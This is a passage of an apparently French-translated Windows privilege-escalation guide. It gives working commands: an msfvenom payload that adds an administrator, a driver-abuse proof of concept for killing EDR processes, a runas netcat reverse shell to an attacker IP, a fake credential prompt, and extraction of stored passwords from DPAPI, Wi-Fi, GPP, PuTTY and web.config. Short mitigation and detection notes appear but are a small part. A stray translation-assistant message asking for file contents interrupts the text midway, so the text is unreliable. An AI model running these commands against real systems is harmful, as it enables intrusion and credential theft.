**Vous pouvez détecter et exploiter** cette vulnérabilité avec metasploit: `exploit/windows/local/trusted\_service\_path` Vous pouvez créer manuellement un binaire de service avec metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Actions de récupération

Windows permet aux utilisateurs de spécifier des actions à exécuter si un service échoue. Cette fonctionnalité peut être configurée pour pointer vers un binaire. Si ce binaire est remplaçable, une privilege escalation pourrait être possible. Plus de détails sont disponibles dans la [documentation officielle](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Applications installées

Vérifiez les **permissions des binaires** (peut-être pouvez-vous en écraser un et escalate privileges) et des **dossiers** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permissions d'écriture

Vérifiez si vous pouvez modifier un fichier de config pour lire un fichier spécial ou si vous pouvez modifier un binaire qui sera exécuté par un compte Administrator (schedtasks).

Une façon de trouver des permissions faibles sur des dossiers/fichiers dans le système est de faire :
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ charge automatiquement n'importe quel plugin DLL sous ses sous-dossiers `plugins`. Si une installation portable/copiable avec permissions d'écriture est présente, déposer un plugin malveillant permet l'exécution automatique de code à l'intérieur de `notepad++.exe` à chaque lancement (y compris depuis `DllMain` et les callbacks du plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Exécution au démarrage

**Vérifiez si vous pouvez écraser une clé de registre ou un binaire qui va être exécuté par un autre utilisateur.**\
**Lisez** la **page suivante** pour en savoir plus sur les **emplacements autoruns intéressants pour escalader les privilèges** :


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Pilotes

Cherchez d'éventuels pilotes tiers **étranges/vulnérables**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Si un driver expose une primitive de lecture/écriture arbitraire du kernel (courante dans des IOCTL handlers mal conçus), vous pouvez escalader en volant un token SYSTEM directement depuis la mémoire du kernel. Voir la technique pas‑à‑pas ici :

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Pour les bugs de race condition où l'appel vulnérable ouvre un chemin Object Manager contrôlé par l'attaquant, ralentir délibérément la résolution (en utilisant des composants de longueur maximale ou des chaînes de répertoires profondes) peut étendre la fenêtre de microsecondes à des dizaines de microsecondes :

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Primitives de corruption mémoire des hives de registre

Les vulnérabilités modernes de hive permettent de préparer des layouts déterministes, d'abuser des descendants écrits de HKLM/HKU, et de convertir une corruption de metadata en kernel paged-pool overflows sans driver custom. Découvrez la chaîne complète ici :

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abus de l'absence de FILE_DEVICE_SECURE_OPEN sur les device objects (LPE + EDR kill)

Certains drivers tiers signés créent leur device object avec un SDDL strict via IoCreateDeviceSecure mais oublient de définir FILE_DEVICE_SECURE_OPEN dans DeviceCharacteristics. Sans ce flag, le DACL sécurisé n'est pas appliqué lorsque le device est ouvert via un chemin contenant un composant supplémentaire, permettant à n'importe quel utilisateur non privilégié d'obtenir un handle en utilisant un chemin de namespace comme :

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Une fois qu'un utilisateur peut ouvrir le device, les IOCTLs privilégiés exposés par le driver peuvent être abusés pour du LPE et des manipulations. Exemples de capacités observées sur le terrain :
- Retourner des handles en accès complet vers des processus arbitraires (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Lecture/écriture raw du disque sans restriction (offline tampering, boot-time persistence tricks).
- Terminer des processus arbitraires, y compris Protected Process/Light (PP/PPL), permettant le kill d'AV/EDR depuis l'espace utilisateur via le kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Atténuations pour les développeurs
- Définissez toujours FILE_DEVICE_SECURE_OPEN lors de la création d'objets de périphérique destinés à être restreints par un DACL.
- Validez le contexte de l'appelant pour les opérations privilégiées. Ajoutez des vérifications PP/PPL avant d'autoriser la terminaison d'un processus ou le retour de handles.
- Limitez les IOCTLs (access masks, METHOD_*, validation des entrées) et envisagez des brokered models plutôt que des privilèges kernel directs.

Idées de détection pour les défenseurs
- Surveillez les ouvertures en user-mode de noms de périphériques suspects (par ex., \\ .\\amsdk*) et les séquences IOCTL spécifiques indicatrices d'abus.
- Appliquez la blocklist de drivers vulnérables de Microsoft (HVCI/WDAC/Smart App Control) et maintenez vos propres listes allow/deny.


## PATH DLL Hijacking

Si vous avez **write permissions inside a folder present on PATH** vous pourriez être capable de hijack une DLL chargée par un processus et **escalate privileges**.

Vérifiez les permissions de tous les dossiers présents dans PATH :
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Pour plus d'informations sur la manière d'abuser de ce contrôle :


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Réseau

### Partages
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Vérifiez la présence d'autres ordinateurs connus hardcoded dans le hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfaces réseau & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Ports ouverts

Vérifiez la présence de **services restreints** depuis l'extérieur
```bash
netstat -ano #Opened ports?
```
### Table de routage
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Table ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Règles du pare-feu

[**Consultez cette page pour les commandes liées au pare-feu**](../basic-cmd-for-pentesters.md#firewall) **(lister les règles, créer des règles, désactiver, désactiver...)**

Plus [de commandes pour network enumeration ici](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Le binaire `bash.exe` peut également être trouvé dans `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Si vous obtenez root user, vous pouvez écouter sur n'importe quel port (la première fois que vous utilisez `nc.exe` pour écouter sur un port, il demandera via GUI si `nc` doit être autorisé par le pare-feu).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Pour démarrer facilement bash en tant que root, vous pouvez essayer `--default-user root`

Vous pouvez explorer le système de fichiers `WSL` dans le dossier `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Identifiants Windows

### Identifiants Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Gestionnaire d'identifiants / Windows vault

Extrait de [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Le Windows Vault stocke les identifiants des utilisateurs pour les serveurs, sites web et autres programmes auxquels **Windows** peut **connecter automatiquement les utilisateurs**. À première vue, cela peut sembler permettre aux utilisateurs de stocker leurs identifiants Facebook, Twitter, Gmail, etc., afin de se connecter automatiquement via les navigateurs. Mais ce n'est pas le cas.

Windows Vault stocke des identifiants que Windows peut utiliser pour connecter automatiquement les utilisateurs, ce qui signifie que toute **application Windows qui a besoin d'identifiants pour accéder à une ressource** (serveur ou site web) **peut utiliser ce Credential Manager** & Windows Vault et se servir des identifiants fournis au lieu que les utilisateurs saisissent le nom d'utilisateur et le mot de passe à chaque fois.

À moins que les applications n'interagissent avec le Credential Manager, je ne pense pas qu'il leur soit possible d'utiliser les identifiants pour une ressource donnée. Donc, si votre application souhaite utiliser le vault, elle doit d'une manière ou d'une autre **communiquer avec le credential manager et demander les identifiants pour cette ressource** au coffre de stockage par défaut.

Utilisez `cmdkey` pour lister les identifiants stockés sur la machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Vous pouvez alors utiliser `runas` avec l'option `/savecred` afin d'utiliser les identifiants enregistrés. L'exemple suivant appelle un binaire distant via un partage SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Utilisation de `runas` avec un ensemble d'identifiants fournis.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Notez que mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), ou depuis le [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

L'API Data Protection (DPAPI) fournit une méthode pour le chiffrement symétrique des données, principalement utilisée dans le système d'exploitation Windows pour le chiffrement symétrique des clés privées asymétriques. Ce chiffrement exploite un secret utilisateur ou système pour contribuer de manière significative à l'entropie.

**DPAPI permet le chiffrement des clés via une clé symétrique dérivée des secrets de connexion de l'utilisateur**. Dans les scénarios impliquant un chiffrement système, il utilise les secrets d'authentification de domaine du système.

Les clés RSA utilisateur chiffrées, grâce à DPAPI, sont stockées dans le répertoire %APPDATA%\Microsoft\Protect\{SID}, où {SID} représente le [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) de l'utilisateur. **La clé DPAPI, co-localisée avec la clé principale qui protège les clés privées de l'utilisateur dans le même fichier**, se compose typiquement de 64 octets de données aléatoires. (Il est important de noter que l'accès à ce répertoire est restreint, empêchant de lister son contenu via la commande `dir` dans CMD, bien qu'il puisse être listé via PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Vous pouvez utiliser le **mimikatz module** `dpapi::masterkey` avec les arguments appropriés (`/pvk` ou `/rpc`) pour le décrypter.

Les **credentials files protected by the master password** sont généralement situés dans :
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Vous pouvez utiliser **mimikatz module** `dpapi::cred` avec le `/masterkey` approprié pour déchiffrer.\  
Vous pouvez **extraire de nombreux masterkeys DPAPI** depuis la **mémoire** avec le module `sekurlsa::dpapi` (si vous êtes root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Identifiants PowerShell

**Identifiants PowerShell** sont souvent utilisés pour les tâches de **scripting** et d'automatisation comme moyen de stocker des identifiants chiffrés de manière pratique. Les identifiants sont protégés par **DPAPI**, ce qui signifie généralement qu'ils ne peuvent être déchiffrés que par le même utilisateur sur le même ordinateur où ils ont été créés.

Pour **déchiffrer** un identifiant PowerShell à partir du fichier qui le contient, vous pouvez faire :
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Connexions RDP enregistrées

Vous pouvez les trouver dans `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
et dans `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Commandes récemment exécutées
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Gestionnaire d'identifiants du Bureau à distance**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Utilisez le module **Mimikatz** `dpapi::rdg` avec le `/masterkey` approprié pour **décrypter n'importe quel fichier .rdg**\
Vous pouvez **extraire de nombreuses DPAPI masterkeys** depuis la mémoire avec le module Mimikatz `sekurlsa::dpapi`

### Sticky Notes

Les gens utilisent souvent l'application Sticky Notes sur les postes Windows pour **enregistrer des mots de passe** et d'autres informations, sans se rendre compte qu'il s'agit d'un fichier de base de données. Ce fichier se trouve à `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` et mérite toujours d'être recherché et examiné.

### AppCmd.exe

**Notez que pour récupérer des mots de passe depuis AppCmd.exe vous devez être Administrateur et exécuter sous un niveau d'intégrité élevé.**\
**AppCmd.exe** se trouve dans le répertoire `%systemroot%\system32\inetsrv\`.\  
Si ce fichier existe alors il est possible que des **credentials** aient été configurés et puissent être **récupérés**.

Ce code a été extrait de [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Vérifier si `C:\Windows\CCM\SCClient.exe` existe .\
Les installateurs sont **exécutés avec les privilèges SYSTEM**, beaucoup sont vulnérables à **DLL Sideloading (Info provenant de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Fichiers et Registre (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Clés d'hôte SSH de Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys dans le registre

Les SSH private keys peuvent être stockées dans la clé de registre `HKCU\Software\OpenSSH\Agent\Keys`, donc vous devriez vérifier s'il y a quelque chose d'intéressant là-dedans :
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Si vous trouvez une entrée dans ce chemin, il s'agit probablement d'une SSH key enregistrée. Elle est stockée chiffrée mais peut être facilement déchiffrée en utilisant [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Plus d'informations sur cette technique ici : [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Si le service `ssh-agent` n'est pas en cours d'exécution et que vous voulez qu'il se lance automatiquement au démarrage, exécutez :
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Il semble que cette technique ne soit plus valide. J'ai essayé de créer des ssh keys, de les ajouter avec `ssh-add` et de me connecter via ssh à une machine. La clé de registre HKCU\Software\OpenSSH\Agent\Keys n'existe pas et procmon n'a pas identifié l'utilisation de `dpapi.dll` pendant l'authentification par clé asymétrique.

### Fichiers non surveillés
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Vous pouvez également rechercher ces fichiers en utilisant **metasploit**: _post/windows/gather/enum_unattend_

Exemple de contenu:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM sauvegardes
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Identifiants Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Recherchez un fichier nommé **SiteList.xml**

### Mot de passe GPP mis en cache

Une fonctionnalité permettait auparavant le déploiement de comptes administrateur locaux personnalisés sur un groupe de machines via Group Policy Preferences (GPP). Cependant, cette méthode présentait d'importantes failles de sécurité. Premièrement, les Group Policy Objects (GPOs), stockés sous forme de fichiers XML dans SYSVOL, pouvaient être consultés par n'importe quel utilisateur du domaine. Deuxièmement, les mots de passe contenus dans ces GPP, chiffrés avec AES256 en utilisant une clé par défaut documentée publiquement, pouvaient être déchiffrés par tout utilisateur authentifié. Cela représentait un risque sérieux, car cela pouvait permettre d'obtenir des privilèges élevés.

Pour atténuer ce risque, une fonction a été développée pour rechercher les fichiers GPP mis en cache localement contenant un champ "cpassword" non vide. Lorsqu'un tel fichier est trouvé, la fonction déchiffre le mot de passe et retourne un objet PowerShell personnalisé. Cet objet inclut des détails sur le GPP et l'emplacement du fichier, facilitant l'identification et la remédiation de cette vulnérabilité.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Pour déchiffrer le cPassword :**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Utilisation de crackmapexec pour récupérer les mots de passe :
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Exemple de web.config avec des identifiants :
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Identifiants OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Demander des credentials

Vous pouvez toujours **demander à l'utilisateur d'entrer ses credentials ou même les credentials d'un autre utilisateur** si vous pensez qu'il peut les connaître (notez que **demander** directement au client les **credentials** est vraiment **risqué**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Noms de fichiers possibles contenant des credentials**

Fichiers connus qui, il y a quelque temps, contenaient des **passwords** en **clear-text** ou encodés en **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have the file contents. Please paste the content of src/windows-hardening/windows-local-privilege-escalation/README.md (or the files you want searched/translated). I will translate the relevant English text to French, preserving all markdown/html tags, links, paths and technical names as you requested.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Identifiants dans la Corbeille

Vous devriez également vérifier la Corbeille pour y chercher des identifiants.

Pour **récupérer les mots de passe** enregistrés par plusieurs programmes, vous pouvez utiliser : [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Dans le registre

**Autres clés de registre pouvant contenir des identifiants**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
